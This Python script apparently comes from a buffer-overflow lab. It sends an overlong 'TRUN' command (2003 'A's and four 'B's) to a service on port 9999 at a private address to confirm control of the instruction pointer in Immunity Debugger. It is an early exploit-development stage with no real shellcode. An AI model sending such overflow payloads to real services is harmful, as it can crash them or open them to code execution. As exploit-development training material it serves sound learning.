#!/usr/bin/python3

import sys, socket

# hex values of A = 41 & B = 42
# we will look for these values in the Immunity Debugger

shellcode = "A" * 2003 + "B" * 4

try:
    # AF_INET = IPv4
    # SOCK_STREAM = PORT
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.168.10.7", 9999))
    payload = "TRUN /.:/" + shellcode
    s.send(payload.encode())
    print(f"Sending shellcode...")
    s.close()

except socket.error as err:
    print(f"Error: {err}")
    sys.exit()
